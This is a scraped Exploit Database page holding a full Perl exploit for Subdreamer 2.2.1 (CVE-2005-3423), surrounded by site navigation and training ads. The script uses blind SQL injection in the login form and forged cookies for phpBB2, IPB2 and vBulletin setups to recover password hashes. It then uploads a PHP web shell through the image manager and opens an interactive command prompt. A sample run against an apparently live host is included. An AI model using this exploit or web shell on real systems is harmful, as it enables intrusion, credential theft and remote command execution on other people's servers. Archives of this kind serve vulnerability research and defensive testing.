@@ -1,0 +1,2838 @@
+
+
+
+
+
+
+
+
+Subdreamer 2.2.1 - SQL Injection / Command Execution - PHP webapps Exploit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }
+
+        function OptanonWrapper() { }
+    
+
+
+        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );
+
+        ga('send', 'pageview');
+    
+
+
+
+
+
+
+
+
+
+        .rbtn {
+            border: 2px solid white;
+            border-radius: 20px;
+            color: black;
+            padding: 8px;
+            cursor: pointer;
+        }
+
+        .rsuccess {
+            border-color: white;
+            color: white;
+        }
+
+        .rsuccess:hover {
+            background-color: white;
+            color: #165283;
+        }
+        .rprimary {
+            border-color: #ca4f0c;
+            color: #ca4f0c;
+        }
+
+        .rprimary:hover {
+            background-color: #ca4f0c;
+            color: white;
+        }
+    
+
+.action-link[data-v-7653bbea] {
+    cursor: pointer;
+}
+
+.action-link[data-v-04b7805e] {
+    cursor: pointer;
+}
+
+.action-link[data-v-7d22a50a] {
+    cursor: pointer;
+}
+
+
+
+
+
+
+             
+
+
+                Exploit Database
+            
+
+
+
+
+
+
+Exploits
+
+
+
+
+
+GHDB
+
+
+
+
+
+Papers
+
+
+
+
+
+Shellcodes
+
+
+
+
+
+
+
+
+Search EDB
+
+
+
+
+
+SearchSploit Manual
+
+
+
+
+
+Submissions
+
+
+
+
+
+
+
+
+Online Training 
+
+
+
+
+
+PWK
+ Penetration Testing with Kali 
+
+
+
+
+AWAE
+ Advanced Web Attacks 
+
+
+
+
+WiFu
+ Wireless Attacks 
+
+
+
+
+
+
+
+
+Offsec Resources
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Stats
+
+
+
+
+
+
+
+About Us
+
+
+
+
+                            About Exploit-DB
+                        
+
+                            Exploit-DB History
+                        
+
+                            FAQ
+                        
+
+
+
+
+
+
+Search
+
+
+
+
+
+
+GET CERTIFIED
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                Subdreamer 2.2.1 - SQL Injection / Command Execution
+                            
+
+
+
+
+
+
+
+
+
+
+
+                                                                EDB-ID:
+                                                            
+
+                                                                1278
+                                                            
+
+
+
+                                                                CVE:
+                                                            
+
+
+                                                                                2005-3423
+                                                                            
+
+
+
+
+
+
+
+
+
+
+EDB Verified:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                Author:
+                                                            
+
+
+                                                                    RusH
+                                                                
+
+
+
+
+                                                                Type:
+                                                            
+
+
+                                                                    webapps
+                                                                
+
+
+
+
+
+
+
+
+
+
+Exploit: 
+
+
+
+                                                  /  
+                                                
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                Platform:
+                                                            
+
+
+                                                                    PHP
+                                                                
+
+
+
+
+                                                                Date:
+                                                            
+
+                                                                2005-10-31
+                                                            
+
+
+
+
+
+
+
+
+
+Vulnerable App:
+
+
+
+
+
+
+
+
+
+
+Become a Certified Penetration Tester
+
+
+                                                        Enroll in
+                                                        
+                                                            
+                                                                Advanced Web Attacks and Exploitation
+                                                            
+
+                                                                                                                , the course
+                                                        required to become an
+                                                                                                                    Offensive Security Web Expert (OSWE)
+                                                        
+
+                                                    
+
+
+
+
+GET CERTIFIED
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#!/usr/bin/perl
+
+## Subdreamer 2.2.1 command exec exploit
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+## supported targets:
+##  ~ without forum integration
+##  ~ with phpBB2 integration
+##  ~ with ipb2 integration
+##  ~ with vbulletin2 integration
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+## based on RST/GHC advisory #35
+## http://rst.void.ru/papers/advisory35.txt
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+## (c)oded by 1dt.w0lf - 19/09/2005
+## RST/GHC
+## http://rst.void.ru
+## http://ghc.ru
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+## work:
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+## r57subdreamer.pl -p http://subdreamer.com.ru/ -u 2 -t 1
+## ------------------------------------------------------------------
+## [~]   PATH : http://subdreamer.com.ru/
+## [~]   USER : 2
+## [~] TARGET : 1 - PhpBB2
+## [1] STEP 1 : TRY GET USER PASSWORD
+## [~] SEARCHING PASSWORD ... [ DONE ]
+## -----------------------------------------------------------
+##  USER_ID: 2
+##     PASS: 26310e438a5a1fb8622738f1e5d34f8b
+## -----------------------------------------------------------
+## [2] STEP 2 : CHECK WHAT USER HAVE ACCESS TO ADMIN ZONE
+## [+] DONE! THIS USER HAVE ACCESS!
+## [3] STEP 3 : UPLOAD FILE
+## [+] DONE! FILE "img.php" UPLOADED
+## [+] WELL DONE! NOW YOU CAN EXECUTE COMMANDS! =)
+## SUBDREAMER# id; uname -a; ls -la;
+## ----------------------------------------------------------------
+## uid=1003(apache) gid=1003(apache) groups=1003(apache)
+## FreeBSD customer-3314.cit-network.net 5.3-RELEASE FreeBSD 5.3-RELEASE #0:
+## Fri Nov  5 04:19:18 UTC 2004     root@harlow.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
+## total 24
+## drwxrwxrwx   5 enshteyn  apache  512 Sep 19 23:04 .
+## drwxr-x---  10 enshteyn  apache  512 Sep 17 21:03 ..
+## drwxr-xr-x   2 enshteyn  apache  512 Sep 10 14:09 Image
+## -rw-r--r--   1 apache    apache   48 Sep 19 23:04 img.php
+## drwxrwxrwx   2 enshteyn  apache  512 Sep 10 14:09 logos
+## drwxrwxrwx   2 enshteyn  apache  512 Sep 10 14:09 smilies
+## ----------------------------------------------------------------
+## SUBDREAMER# exit
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+## config
+## ------
+##
+## images folder
+$img_folder = 'images';
+## or try
+##$img_folder = 'images/logos';
+##
+## end config
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+use Getopt::Std;
+
+getopts('u:p:h:t:');
+
+$path = $opt_p;
+$user = $opt_u;
+$hash = $opt_h;
+$target = $opt_t || 0;
+
+$s_num = 1;
+$|++;
+$n = 0;
+
+@targets = (
+#['target name','colimn1 in database','colimn2 in database','cookie name 1','cookie name 2']
+ ['Subdreamer without forum','userid','password','sduserid','sdpassword'],
+ ['PhpBB2','user_id','user_password','phpbb2mysql_data',''],
+ ['IPB2','id','member_login_key','member_id','pass_hash'],
+ ['PhpBB2 cookie injection','','','phpbb2mysql_data',''],
+ ['IPB2 cookie injection','id','','member_id','pass_hash'],
+ ['Vbulletin cookie injection','userid','','bbuserid','bbpassword'],
+);
+
+if (!$path || !$user || $target<0 || $target>5) { &usage; }
+&head();
+if($path=~/[^\/]$/) { $path .= '/'; }
+print "[~]   PATH : $path\r\n";
+print "[~]   USER : $user\r\n";
+print "[~] TARGET : $target - $targets[$target][0]\r\n";
+if($target==1||$target==2||$target==0) {
+print "[1] STEP 1 : TRY GET USER PASSWORD\r\n";
+if(!$hash){
+print "[~] SEARCHING PASSWORD ... [|]";
+
+FIND: while(1)
+{
+if(&found(47,58)==0) { &found(96,103); } 
+$char = $i;
+if ($char=="0") 
+ { 
+ if(length($allchar) > 0){
+ print qq{\b\b DONE ] 
+-----------------------------------------------------------
+ USER_ID: $user
+    PASS: $allchar
+-----------------------------------------------------------
+};
+ last FIND;
+ }
+ else
+ {
+ print "\b\b FAILED ]";
+ }
+ exit(); 
+ }
+else 
+ {  
+ $allchar .= chr($char); 
+ }
+$s_num++;
+}
+}
+else
+{
+print "[~] SKIP. HASH EXISTS\r\n"; 
+$allchar = $hash;
+}
+}
+
+print "[2] STEP 2 : CHECK WHAT USER HAVE ACCESS TO ADMIN ZONE\r\n";
+if(&check_admin_rights())
+ {
+ print "[+] DONE! THIS USER HAVE ACCESS!\r\n"; 
+ }
+else
+ {
+ print "[-] DAMN! THIS USER NOT ADMIN =(\r\n"; 
+ exit();
+ }
+
+print "[3] STEP 3 : UPLOAD FILE\r\n";
+if(&upload_file())
+ {
+ print "[+] DONE! FILE \"img.php\" UPLOADED\r\n"; 
+ }
+else
+ { 
+ print "[-] DAMN! UPLOAD ERROR =(\r\n"; 
+ exit();
+ }
+print "[+] WELL DONE! NOW YOU CAN EXECUTE COMMANDS! =)\r\n"; 
+
+while ()
+ {
+    print "SUBDREAMER# ";
+    while(<STDIN>)
+     {
+        $cmd=$_;
+        chomp($cmd);
+        exit() if ($cmd eq 'exit');
+        last;
+     }
+    &run($cmd);
+ }
+ 
+sub found($$)
+ {
+ my $fmin = $_[0];
+ my $fmax = $_[1];
+ if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
+ 
+ $r = int($fmax - ($fmax-$fmin)/2);
+ $check = " BETWEEN $r AND $fmax";
+ if ( &check($check) ) { &found($r,$fmax); }
+ else { &found($fmin,$r); }
+ }
+ 
+sub crack($$)
+ {
+ my $cmin = $_[0];
+ my $cmax = $_[1];
+ $i = $cmin;
+ while ($i<$cmax)
+  {
+  $crcheck = "=$i";
+  if ( &check($crcheck) ) { return $i; }
+  $i++;
+  }
+ $i = 0;
+ return $i;
+ }
+ 
+sub check($)
+ {
+ $n++;
+ status();
+ $ccheck = $_[0];
+ $username = "no_such_user' OR (".$targets[$target][1]."=".$user." AND (ascii(substring(".$targets[$target][2].",".$s_num.",1))".$ccheck.")) /*";
+  
+ $xpl = LWP::UserAgent->new() or die;
+ $res = $xpl->post($path.'index.php',
+ {
+ "loginusername" => $username,
+ "loginpassword" => "nap0Jlb_Haxep",
+ "login"         => "login",
+ "Submit now"    => "Login"
+ }
+ ); 
+ @results = $res->content; 
+ 
+ foreach $result(@results)
+  {
+  if ($result =~ /(Database error)|(Invalid SQL)/i)
+   {
+   print "\r\n[-] SQL SYNTAX ERROR! CHECK TARGET!\r\n"; 
+   exit();
+   }
+  #print $result;
+  # english pattern
+  if ($result =~ /Wrong Password/) { return 1; }
+  # russian pattern
+  if ($result =~ /...... ......./) { return 1; }
+  # russian pattern 2
+  if ($result =~ /............ ....../) { return 1; }
+  # russian pattern 3 ( KOI8-R tested on subdreamer.com.ru )
+  if ($result =~ /...... ......./) { return 1; }
+  }
+ return 0;
+ }
+ 
+sub status()
+{
+  $status = $n % 5;
+  if($status==0){ print "\b\b/]";  }
+  if($status==1){ print "\b\b-]";  }
+  if($status==2){ print "\b\b\\]"; }
+  if($status==3){ print "\b\b|]";  }
+}
+
+sub check_admin_rights()
+ {
+ $xpl = LWP::UserAgent->new() or die;
+ $cookie_jar = HTTP::Cookies->new( );
+ $xpl->cookie_jar( $cookie_jar );
+ ($host = $path) =~ s!http://([^/]*).*!$1!;
+
+if($target == 1)
+  {
+  # not default phpbb2 cookie, work for subdreamer.com.ru ... maybe default for subdreamer pro RU ???
+  #$cookie_jar->set_cookie( "0",$targets[$target][3], 'autologinid='.$allchar.'|userid='.$user,"/",$host,,,,,);
+  # default phpbb2 cookie  
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A32%3A%22".$allchar."%22%3Bs%3A6%3A%22userid%22%3Bs%3A".length($user)."%3A%22".$user."%22%3B%7D","/",$host,,,,,);
+  }
+ elsif($target == 3)
+  {
+  # phpbb2 cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A3%3A%22666%22%3Bs%3A6%3A%22userid%22%3Bs%3A".(length($user)+4)."%3A%22".$user."%27+%2F%2A%22%3B%7D","/",$host,,,,,);  
+  }
+ elsif($target == 4)
+  {
+  # ipb2 cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"666\\","/",$host,,,,,);  
+  $cookie_jar->set_cookie( "1",$targets[$target][4],"/**/OR/**/".$targets[$target][2]."=".$user."","/",$host,,,,,);
+  }
+ elsif($target == 5)
+  {
+  # Vbulletin cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"666\\","/",$host,,,,,);  
+  $cookie_jar->set_cookie( "1",$targets[$target][4],"/**/OR/**/".$targets[$target][2]."=".$user."","/",$host,,,,,);
+  }
+ else
+  {
+  # subdreamer || ipb2 cookies
+  $cookie_jar->set_cookie( "0",$targets[$target][3], $user,"/",$host,,,,,);
+  $cookie_jar->set_cookie( "1",$targets[$target][4], $allchar,"/",$host,,,,,);
+  }
+  
+ $res = $xpl->get($path."admin/index.php");
+ if($res->content =~ /loginpassword/) { return 0; }
+ else { return 1; }
+ }
+
+sub upload_file()
+ {
+ $xpl = LWP::UserAgent->new() or die;
+ $cookie_jar = HTTP::Cookies->new( );
+ $xpl->cookie_jar( $cookie_jar );
+ ($host = $path) =~ s!http://([^/]*).*!$1!;
+ 
+ if($target == 1)
+  {
+  # not default phpbb2 cookie, work for subdreamer.com.ru ... maybe default for subdreamer pro RU ???
+  #$cookie_jar->set_cookie( "0",$targets[$target][3], 'autologinid='.$allchar.'|userid='.$user,"/",$host,,,,,);
+  # default phpbb2 cookie
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A32%3A%22".$allchar."%22%3Bs%3A6%3A%22userid%22%3Bs%3A".length($user)."%3A%22".$user."%22%3B%7D","/",$host,,,,,);
+  }
+ elsif($target == 3)
+  {
+  # phpbb2 cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A3%3A%22666%22%3Bs%3A6%3A%22userid%22%3Bs%3A".(length($user)+4)."%3A%22".$user."%27+%2F%2A%22%3B%7D","/",$host,,,,,);  
+  }
+ elsif($target == 4)
+  {
+  # ipb2 cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"666\\","/",$host,,,,,);  
+  $cookie_jar->set_cookie( "1",$targets[$target][4],"/**/OR/**/".$targets[$target][2]."=".$user."","/",$host,,,,,);
+  }
+ elsif($target == 5)
+  {
+  # Vbulletin cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"666\\","/",$host,,,,,);  
+  $cookie_jar->set_cookie( "1",$targets[$target][4],"/**/OR/**/".$targets[$target][2]."=".$user."","/",$host,,,,,);
+  }
+ else
+  {
+  # subdreamer || ipb2 cookies
+  $cookie_jar->set_cookie( "0",$targets[$target][3], $user,"/",$host,,,,,);
+  $cookie_jar->set_cookie( "1",$targets[$target][4], $allchar,"/",$host,,,,,);
+  }
+  
+ $res = $xpl->post($path.'admin/imagemanager.php',Content_Type => 'form-data',
+ Content => [
+ 'action'        => 'uploadimage',
+ 'folderpath'    => "../$img_folder/",
+ 'MAX_FILE_SIZE' => '1000000',
+ 'image'   => [ 
+               undef,
+               'img.php', 
+               Content_type => 'text/plain',
+               Content => '<? if($_POST[cmd]) { passthru($_POST[cmd]); } ?>', 
+              ],
+ 'submit'        => 'Upload Image',
+ ],
+ );
+ if($res->content =~ /Settings Updated/) { return 1; }
+ if($res->content =~ /Uploading Errors/) { return 0; }
+ else { return 1; }
+ }
+
+sub run()
+ {
+ $xpl = LWP::UserAgent->new() or die;
+ $res = $xpl->post($path.$img_folder.'/img.php',{'cmd'=>$cmd}); 
+ print "----------------------------------------------------------------\r\n";
+ print $res->content;
+ print "----------------------------------------------------------------\r\n";
+ }
+
+sub usage()
+ {
+ &head();
+ print q(|                                                                    |
+| - Usage:                                                           |
+| r57subdreamer.pl -p <path> -u <user_id> [-t <target>] [-h <hash>]  |
+|     <path>    - Path to subdreamer folder                          |
+|     <user_id> - User id for bruteforce                             |
+|     <hash>    - MD5 password hash for this user if you have it =\)  |
+| - Available targets:                                               |
+|          - brute password:                                         |
+|               0 - Subdreamer without forum integration ( default ) |
+|               1 - Subdreamer with PhpBB2 integration               |
+|               2 - Subdreamer with IPB2 integration                 |
+|          - cookie sql injection, dont need brute password:         |
+|               3 - Subdreamer with PhpBB2 integration 2             |
+|               4 - Subdreamer with IPB2 integration 2               |
+|               5 - Subdreamer with Vbulletin integration            |
++--------------------------------------------------------------------+
+| e.g.:                                                              |
+| r57subdreamer.pl -p http://127.0.0.1/subdreamer/ -u 1              |
+| r57subdreamer.pl -p http://www.subdreamer.com.ru -u 2 -t 1         | 
++--------------------------------------------------------------------+
+| visit us: http://rst.void.ru , http://ghc.ru                       |
++--------------------------------------------------------------------+
+ );
+ exit();
+ }
+
+sub head()
+ {
+ print q(
++--------------------------------------------------------------------+
+| Subdreamer version 2.2.1 sql injection + command execution exploit |
+|                          by 1dt.w0lf                               |
+|                            RST/GHC                                 |
++--------------------------------------------------------------------+
+);}
+
+# milw0rm.com [2005-10-31]
+            Copy
+
+
+
+
+Tags:
+
+
+
+
+
+Advisory/Source:
+
+                                        Link
+                                    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Downloads
+
+
+Certifications
+
+
+Training
+
+
+Professional Services
+
+
+
+
+
+
+
+                            Kali Linux
+                        
+
+
+OSCP
+                        
+
+
+Penetration Testing with Kali Linux (PWK)
+                        
+
+
+Penetration Testing
+                        
+
+
+
+
+
+                            Kali NetHunter
+                        
+
+
+OSWP
+                        
+
+
+Advanced Web Attacks and Exploitation (AWAE)
+                        
+
+
+Advanced Attack Simulation
+                        
+
+
+
+
+
+                            Kali Linux Revealed Book
+                        
+
+
+OSCE
+                        
+
+
+Offensive Security Wireless Attacks (WiFu)
+                        
+
+
+Application Security Assessment
+                        
+
+
+
+
+
+OSEE
+                        
+
+
+Cracking the Perimeter (CTP)
+                        
+
+
+
+
+
+
+OSWE
+                        
+
+
+Metasploit Unleashed (MSFU)
+                        
+
+
+
+
+
+
+KLCP
+                        
+
+
+
+                            Free Kali Linux Training
+                        
+
+
+
+
+
+
+
+
+
+
+                Downloads
+            
+
+
+                    Kali Linux
+                
+
+                    Kali NetHunter
+                
+
+                    Kali Linux Revealed Book
+                
+
+
+
+
+                Certifications
+            
+
+OSCP
+                
+OSWP
+                
+OSCE
+                
+OSEE
+                
+OSWE
+                
+KLCP
+                
+
+
+
+
+                Training
+            
+
+Penetration Testing with Kali Linux (PWK)
+                
+Advanced Web Attacks and Exploitation (AWAE)
+                
+Offensive Security Wireless Attacks (WiFu)
+                
+Cracking the Perimeter (CTP)
+                
+Metasploit Unleashed (MSFU)
+                
+
+                    Free Kali Linux training
+                
+
+
+
+
+                Pro Services
+            
+
+Penetration Testing
+                
+Advanced Attack Simulation
+                
+Application Security Assessment
+                
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+                        Exploit Database by Offensive Security
+                    
+
+
+
+                        Terms
+                    
+
+
+
+                        Privacy
+                    
+
+
+
+                        About Us
+                    
+
+
+
+                        FAQ
+                    
+
+
+
+                        Cookies
+                    
+
+
+
+
+
+
+
+
+
+            ©
+            Copyright 2019, Exploit Database
+
+
+
+
+
+
+
+About The Exploit Database
+                
+
+×
+
+
+
+
+
+
+
+
+                        The Exploit Database is maintained by Offensive Security, an information security training company
+                        that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
+                        non-profit project that is provided as a public service by Offensive Security.
+                    
+The Exploit Database is a CVE
+                            compliant archive of public exploits and corresponding vulnerable software,
+                        developed for use by penetration testers and vulnerability researchers. Our aim is to serve
+                        the most comprehensive collection of exploits gathered through direct submissions, mailing
+                        lists, as well as other public sources, and present them in a freely-available and
+                        easy-to-navigate database. The Exploit Database is a repository for exploits and
+                        proof-of-concepts rather than advisories, making it a valuable resource for those who need
+                        actionable data right away.
+                    
+The Google Hacking Database (GHDB)
+                        is a categorized index of Internet search engine queries designed to uncover interesting,
+                        and usually sensitive, information made publicly available on the Internet. In most cases,
+                        this information was never meant to be made public but due to any number of factors this
+                        information was linked in a web document that was crawled by a search engine that
+                        subsequently followed that link and indexed the sensitive information.
+                    
+The process known as “Google Hacking” was popularized in 2000 by Johnny
+                        Long, a professional hacker, who began cataloging these queries in a database known as the
+                        Google Hacking Database. His initial efforts were amplified by countless hours of community
+                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
+                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
+                        recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
+                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
+                        the fact that this was not a “Google problem” but rather the result of an often
+                        unintentional misconfiguration on the part of a user or a program installed by the user.
+                        Over time, the term “dork” became shorthand for a search query that located sensitive
+                        information and “dorks” were included with may web application vulnerability releases to
+                        show examples of vulnerable web sites.
+                    
+After nearly a decade of hard work by the community, Johnny turned the GHDB
+                        over to Offensive Security in November 2010, and it is now maintained as
+                        an extension of the Exploit Database. Today, the GHDB includes searches for
+                        other online search engines such as Bing,
+                        and other online repositories like GitHub,
+                        producing different, yet equally valuable results.
+                    
+
+
+
+Close
+                
+
+
+
+
+
+
+
+
+Offensive Security Resources
+                
+
+×
+
+
+
+
+
+
+Downloads
+Certifications
+Training
+Services
+
+
+
+
+
+
+                                        Kali Linux
+                                    
+
+
+OSCP
+                                    
+
+
+Penetration Testing with Kali Linux (PWK)
+                                    
+
+
+Penetration Testing
+                                    
+
+
+
+
+
+                                        Kali NetHunter
+                                    
+
+
+OSWP
+                                    
+
+
+Offensive Security Wireless Attacks (WiFu)
+                                    
+
+
+Advanced Attack Simulation
+                                    
+
+
+
+
+
+                                        Kali Linux Revealed Book
+                                    
+
+
+OSCE
+                                    
+
+
+Cracking the Perimeter (CTP)
+                                    
+
+
+Application Security Assessment
+                                    
+
+
+
+
+
+OSEE
+                                    
+
+
+Advanced Web Attacks (AWAE)
+                                    
+
+
+
+
+
+
+OSWE
+                                    
+
+
+Metasploit Unleashed (MSFU)
+                                    
+
+
+
+
+
+
+KLCP
+                                    
+
+
+
+                                        Free Kali Linux training
+                                    
+
+
+
+
+
+
+
+Close
+                
+
+
+
+
+
+
+
+
+
+Search The Exploit Database
+                
+
+×
+
+
+
+
+
+
+
+Title
+
+
+
+
+
+CVE
+
+
+
+
+
+
+Type
+
+
+
+                                        dos
+                                    
+
+                                        local
+                                    
+
+                                        remote
+                                    
+
+                                        shellcode
+                                    
+
+                                        papers
+                                    
+
+                                        webapps
+                                    
+
+
+
+Platform
+
+
+
+                                        AIX
+                                    
+
+                                        ASP
+                                    
+
+                                        BSD
+                                    
+
+                                        BSD_PPC
+                                    
+
+                                        BSD_x86
+                                    
+
+                                        BSDi_x86
+                                    
+
+                                        CGI
+                                    
+
+                                        FreeBSD
+                                    
+
+                                        FreeBSD_x86
+                                    
+
+                                        FreeBSD_x86-64
+                                    
+
+                                        Generator
+                                    
+
+                                        Hardware
+                                    
+
+                                        HP-UX
+                                    
+
+                                        IRIX
+                                    
+
+                                        JSP
+                                    
+
+                                        Linux
+                                    
+
+                                        Linux_MIPS
+                                    
+
+                                        Linux_PPC
+                                    
+
+                                        Linux_SPARC
+                                    
+
+                                        Linux_x86
+                                    
+
+                                        Linux_x86-64
+                                    
+
+                                        MINIX
+                                    
+
+                                        Multiple
+                                    
+
+                                        NetBSD_x86
+                                    
+
+                                        Novell
+                                    
+
+                                        OpenBSD
+                                    
+
+                                        OpenBSD_x86
+                                    
+
+                                        OSX_PPC
+                                    
+
+                                        OSX
+                                    
+
+                                        PHP
+                                    
+
+                                        Plan9
+                                    
+
+                                        QNX
+                                    
+
+                                        SCO
+                                    
+
+                                        SCO_x86
+                                    
+
+                                        Solaris
+                                    
+
+                                        Solaris_SPARC
+                                    
+
+                                        Solaris_x86
+                                    
+
+                                        Tru64
+                                    
+
+                                        ULTRIX
+                                    
+
+                                        Unix
+                                    
+
+                                        UnixWare
+                                    
+
+                                        Windows_x86
+                                    
+
+                                        Windows_x86-64
+                                    
+
+                                        Windows
+                                    
+
+                                        ARM
+                                    
+
+                                        CFM
+                                    
+
+                                        Netware
+                                    
+
+                                        SuperH_SH4
+                                    
+
+                                        Java
+                                    
+
+                                        BeOS
+                                    
+
+                                        Immunix
+                                    
+
+                                        Palm_OS
+                                    
+
+                                        AtheOS
+                                    
+
+                                        iOS
+                                    
+
+                                        Android
+                                    
+
+                                        XML
+                                    
+
+                                        Perl
+                                    
+
+                                        Python
+                                    
+
+                                        System_z
+                                    
+
+                                        JSON
+                                    
+
+                                        ASHX
+                                    
+
+                                        Ruby
+                                    
+
+                                        ASPX
+                                    
+
+                                        macOS
+                                    
+
+                                        Linux_CRISv32
+                                    
+
+                                        eZine
+                                    
+
+                                        Magazine
+                                    
+
+                                        NodeJS
+                                    
+
+                                        Alpha
+                                    
+
+                                        Solaris_MIPS
+                                    
+
+                                        Lua
+                                    
+
+                                        watchOS
+                                    
+
+                                        VxWorks
+                                    
+
+
+
+
+Author
+
+
+
+
+
+
+
+Content
+
+
+
+
+Port
+
+
+
+                                        14
+                                    
+
+                                        21
+                                    
+
+                                        22
+                                    
+
+                                        23
+                                    
+
+                                        25
+                                    
+
+                                        42
+                                    
+
+                                        49
+                                    
+
+                                        53
+                                    
+
+                                        66
+                                    
+
+                                        69
+                                    
+
+                                        70
+                                    
+
+                                        79
+                                    
+
+                                        80
+                                    
+
+                                        81
+                                    
+
+                                        102
+                                    
+
+                                        105
+                                    
+
+                                        110
+                                    
+
+                                        111
+                                    
+
+                                        113
+                                    
+
+                                        119
+                                    
+
+                                        123
+                                    
+
+                                        135
+                                    
+
+                                        139
+                                    
+
+                                        143
+                                    
+
+                                        161
+                                    
+
+                                        162
+                                    
+
+                                        164
+                                    
+
+                                        383
+                                    
+
+                                        389
+                                    
+
+                                        402
+                                    
+
+                                        406
+                                    
+
+                                        411
+                                    
+
+                                        443
+                                    
+
+                                        444
+                                    
+
+                                        445
+                                    
+
+                                        446
+                                    
+
+                                        502
+                                    
+
+                                        504
+                                    
+
+                                        513
+                                    
+
+                                        514
+                                    
+
+                                        515
+                                    
+
+                                        532
+                                    
+
+                                        548
+                                    
+
+                                        554
+                                    
+
+                                        555
+                                    
+
+                                        617
+                                    
+
+                                        623
+                                    
+
+                                        631
+                                    
+
+                                        655
+                                    
+
+                                        689
+                                    
+
+                                        783
+                                    
+
+                                        787
+                                    
+
+                                        808
+                                    
+
+                                        873
+                                    
+
+                                        888
+                                    
+
+                                        901
+                                    
+
+                                        998
+                                    
+
+                                        1000
+                                    
+
+                                        1040
+                                    
+
+                                        1089
+                                    
+
+                                        1099
+                                    
+
+                                        1100
+                                    
+
+                                        1114
+                                    
+
+                                        1120
+                                    
+
+                                        1194
+                                    
+
+                                        1235
+                                    
+
+                                        1471
+                                    
+
+                                        1521
+                                    
+
+                                        1533
+                                    
+
+                                        1581
+                                    
+
+                                        1589
+                                    
+
+                                        1604
+                                    
+
+                                        1617
+                                    
+
+                                        1723
+                                    
+
+                                        1743
+                                    
+
+                                        1761
+                                    
+
+                                        1812
+                                    
+
+                                        1858
+                                    
+
+                                        1861
+                                    
+
+                                        1900
+                                    
+
+                                        1947
+                                    
+
+                                        2000
+                                    
+
+                                        2022
+                                    
+
+                                        2049
+                                    
+
+                                        2100
+                                    
+
+                                        2103
+                                    
+
+                                        2121
+                                    
+
+                                        2125
+                                    
+
+                                        2181
+                                    
+
+                                        2242
+                                    
+
+                                        2315
+                                    
+
+                                        2375
+                                    
+
+                                        2380
+                                    
+
+                                        2381
+                                    
+
+                                        2401
+                                    
+
+                                        2480
+                                    
+
+                                        2525
+                                    
+
+                                        2640
+                                    
+
+                                        2810
+                                    
+
+                                        2812
+                                    
+
+                                        2947
+                                    
+
+                                        2954
+                                    
+
+                                        2990
+                                    
+
+                                        3000
+                                    
+
+                                        3030
+                                    
+
+                                        3050
+                                    
+
+                                        3052
+                                    
+
+                                        3128
+                                    
+
+                                        3129
+                                    
+
+                                        3181
+                                    
+
+                                        3200
+                                    
+
+                                        3217
+                                    
+
+                                        3306
+                                    
+
+                                        3333
+                                    
+
+                                        3378
+                                    
+
+                                        3389
+                                    
+
+                                        3460
+                                    
+
+                                        3465
+                                    
+
+                                        3500
+                                    
+
+                                        3535
+                                    
+
+                                        3632
+                                    
+
+                                        3690
+                                    
+
+                                        3790
+                                    
+
+                                        3814
+                                    
+
+                                        3817
+                                    
+
+                                        4000
+                                    
+
+                                        4002
